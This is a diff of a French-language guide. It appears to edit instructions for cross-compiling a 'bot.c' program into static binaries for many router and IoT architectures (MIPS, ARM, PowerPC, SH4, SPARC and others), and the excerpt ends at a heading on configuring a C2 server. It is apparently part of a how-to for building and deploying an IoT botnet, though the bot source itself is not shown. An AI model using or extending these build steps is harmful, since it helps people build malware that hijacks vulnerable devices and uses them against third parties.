@@ -98,13 +98,13 @@ sudo ln -s /usr/include/asm-generic /usr/sparc64-linux-gnu/usr/include/asm
 ### Compilation pour différentes architectures
 ```
 # MIPS (routeurs courants)
-mips-linux-gnu-gcc -static -o bot.mips bot.c
+mips-linux-gnu-gcc -static -o bot.mips bot.c -D__MIPS__
 
 # ARM (IoT, routeurs)
-arm-linux-gnueabi-gcc -static -o bot.arm bot.c
+arm-linux-gnueabi-gcc -static -o bot.arm bot.c -D__ARM__
 
 # ARM64 (appareils modernes)
-aarch64-linux-gnu-gcc -static -o bot.arm7 bot.c
+aarch64-linux-gnu-gcc -static -o bot.arm7 bot.c -D__ARM__
 
 # x86 (ordinateurs 32-bit)
 gcc -m32 -static -o bot.x86 bot.c
@@ -113,7 +113,7 @@ gcc -m32 -static -o bot.x86 bot.c
 gcc -static -o bot.x86_64 bot.c
 
 # PowerPC
-powerpc-linux-gnu-gcc -static -o bot.ppc bot.c
+powerpc-linux-gnu-gcc -static -o bot.ppc bot.c -D__PPC__
 
 # SH4 (anciens appareils embarqués)
 sh4-linux-gnu-gcc -static -o bot.sh4 bot.c
@@ -122,7 +122,7 @@ sh4-linux-gnu-gcc -static -o bot.sh4 bot.c
 m68k-linux-gnu-gcc -static -o bot.m68k bot.c
 
 # SPARC (serveurs)
-sparc64-linux-gnu-gcc -static -o bot.sparc bot.c
+sparc64-linux-gnu-gcc -static -o bot.sparc bot.c -D__SPARC__
 ```
 
 ## 3. Configuration du serveur C2
